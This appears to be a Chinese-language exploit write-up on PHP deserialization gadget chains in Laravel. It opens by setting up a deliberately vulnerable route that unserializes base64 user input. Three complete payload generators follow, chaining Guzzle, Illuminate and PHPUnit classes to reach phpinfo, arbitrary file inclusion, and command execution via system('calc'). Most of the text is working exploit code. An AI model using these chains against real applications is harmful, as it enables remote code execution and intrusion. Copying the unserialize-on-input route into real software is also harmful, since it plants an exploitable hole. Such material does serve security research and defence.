# 环境搭建

直接在github下载，然后`composer install`安装

Routes/web.php

修改路由

```
<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

//Route::get('/', function () {
//    return view('welcome');
//});

Route::get('/', function (\Illuminate\Http\Request $request) {

    $vuln = base64_decode($request->input("vuln"));
    unserialize($vuln);
    return "Hello DawnT0wn";
});
```

启动服务

```
php8 artisan serve
```

如果出现500到错误的话，打开配置文件 laravel/config/app.php

![image-20230214174410289](images/1.png)

将debug修改为true，然后将laravel目录下的`.env.example`复制一份为`.env`

最后命令行输入

```
php8 artisan key:generate
```

![image-20230214174532284](images/2.png)

# 漏洞复现

## 第一条

```
<?php
namespace GuzzleHttp\Cookie{
    use Illuminate\Validation\Rules\ExcludeIf;
    class CookieJar{
        private $cookies = [];
        function __construct() {
            $this->cookies[] = ["aaa"];
        }
    }

    class FileCookieJar extends CookieJar {
        private $filename;
        function __construct() {
            parent::__construct();
            $this->filename = new ExcludeIf();
        }
    }
}
namespace Illuminate\Validation\Rules{
    class ExcludeIf{
        public $condition;
        function __construct(){
            $this->condition = "phpinfo";
        }
    }
}

namespace{
    $pop = new \GuzzleHttp\Cookie\FileCookieJar();
    echo urlencode(base64_encode(serialize($pop)));
}
//phpinfo();
```

这一条最后只能执行phpinfo

## 第二条

这条可以任意文件包含，但是不会输出结果，需要同文件上传一起使用

```
<?php
namespace GuzzleHttp\Cookie{

    use Illuminate\View\FileViewFinder;
    use Illuminate\View\View;
    use Illuminate\View\Factory;
    use Illuminate\View\Engines\PhpEngine;
    use Illuminate\View\Engines\EngineResolver;
    use Illuminate\Filesystem\Filesystem;

    class CookieJar{
        private $cookies = [];
        function __construct() {
            $this->cookies[] = [];
        }
    }

    class FileCookieJar extends CookieJar {
        private $filename;
        function __construct() {
            parent::__construct();
            $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new PhpEngine(new Filesystem()),1,"./info.php",["index"]);
        }
    }
}
namespace Illuminate\View{

    use Illuminate\Events\Dispatcher;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\View\Engines\EngineResolver;
    use Illuminate\View\Engines\PhpEngine;


    class FileViewFinder implements ViewFinderInterface{
        public function __construct(Filesystem $files, array $paths, array $extensions = null){}
    }
    interface ViewFinderInterface{}
    class Factory{
        protected $shared = [];
        public function __construct(EngineResolver $engines, ViewFinderInterface $finder)
        {
            $this->shared = [];
            $this->finder = $finder;
            $this->events = new Dispatcher();
            $this->engines = $engines;
        }
    }
    class View{
        protected $data;
        public function __construct(Factory $factory, PhpEngine $engine, $view, $path, $data = [])
        {
            $this->view = $view;
            $this->path = "/Users/DawnT0wn/1.txt"; 
            $this->engine = $engine;
            $this->factory = $factory;
            $this->data = [];
        }
    }
}
namespace Illuminate\View\Engines{

    use Illuminate\Filesystem\Filesystem;

    class PhpEngine{
        protected $files;
        public function __construct(Filesystem $files)
        {
            $this->files = $files;
        }
    }
}
namespace Illuminate\Filesystem{
    class Filesystem{

    }
}
namespace Illuminate\View\Engines{
    class EngineResolver{

    }
}
namespace Illuminate\Events{

    use Illuminate\Contracts\Events\Dispatcher as DispatcherContract;

    class Dispatcher implements DispatcherContract{

    }

}
namespace Illuminate\Contracts\Events{
    interface Dispatcher{};
}


namespace{

    use GuzzleHttp\Cookie\FileCookieJar;

    $pop = new FileCookieJar();
    echo urlencode(base64_encode(serialize($pop)));
}
```



## 第三条

```
<?php
namespace GuzzleHttp\Cookie{


    use Illuminate\Filesystem\FilesystemAdapter;
    use Illuminate\View\FileViewFinder;
    use Illuminate\View\View;
    use Illuminate\View\Factory;
    use Illuminate\View\Engines\EngineResolver;
    use Illuminate\Filesystem\Filesystem;

    class CookieJar{ //调用__toString
        private $cookies = [];
        function __construct() {
            $this->cookies[] = [];
        }
    }
    class FileCookieJar extends CookieJar {
        private $filename;
        function __construct() {
            parent::__construct();
            $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]);
        }
    }
}
namespace Illuminate\View{ //调用任意类get方法


    use Illuminate\Events\Dispatcher;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Filesystem\FilesystemAdapter;
    use Illuminate\View\Engines\EngineResolver;


    class FileViewFinder implements ViewFinderInterface{
        public function __construct(Filesystem $files, array $paths, array $extensions = null){}
    }
    interface ViewFinderInterface{}
    class Factory{
        protected $shared = [];
        public function __construct(EngineResolver $engines, ViewFinderInterface $finder){
            $this->shared = [];
            $this->finder = $finder;
            $this->events = new Dispatcher();
            $this->engines = $engines;
        }
    }
    class View{
        protected $data;
        public function __construct(Factory $factory, FilesystemAdapter $engine, $view, $path){
            $this->view = $view;
            $this->path = $path;
            $this->engine = $engine; //CacheLock
            $this->factory = $factory;
            $this->data = [];
        }
    }
}

namespace Illuminate\Filesystem{ //调用read方法

    use Illuminate\Session\CookieSessionHandler;

    class Filesystem{}
    class FilesystemAdapter{
        protected $driver;
        public function __construct(){
            $this->driver = new CookieSessionHandler();
        }
    }
}
namespace Illuminate\View\Engines{
    class EngineResolver{}
}
namespace Illuminate\Events{
    use Illuminate\Contracts\Events\Dispatcher as DispatcherContract;
    class Dispatcher implements DispatcherContract{}

}
namespace Illuminate\Contracts\Events{
    interface Dispatcher{};
}

namespace Illuminate\Session{
    use Illuminate\Support\HigherOrderCollectionProxy;
    class CookieSessionHandler{
        public function __construct(){
            $this->request = new HigherOrderCollectionProxy();
        }
    }
}
namespace Illuminate\Support{

    use PHPUnit\Framework\MockObject\MockClass;

    class HigherOrderCollectionProxy{
        public function __construct(){
            $this->collection = new MockClass();
            $this->method = "generate";
        }
    }
}
namespace PHPUnit\Framework\MockObject{
    final class MockClass{
        public function __construct(){
            $this->classCode = "system('calc');";
            $this->mockName  = '123';
        }
    }
}




namespace{

    use GuzzleHttp\Cookie\FileCookieJar;

    $pop = new FileCookieJar();
    echo urlencode(base64_encode(serialize($pop)));
}
```

参考链接

https://blog.csdn.net/zhunju0089/article/details/103451116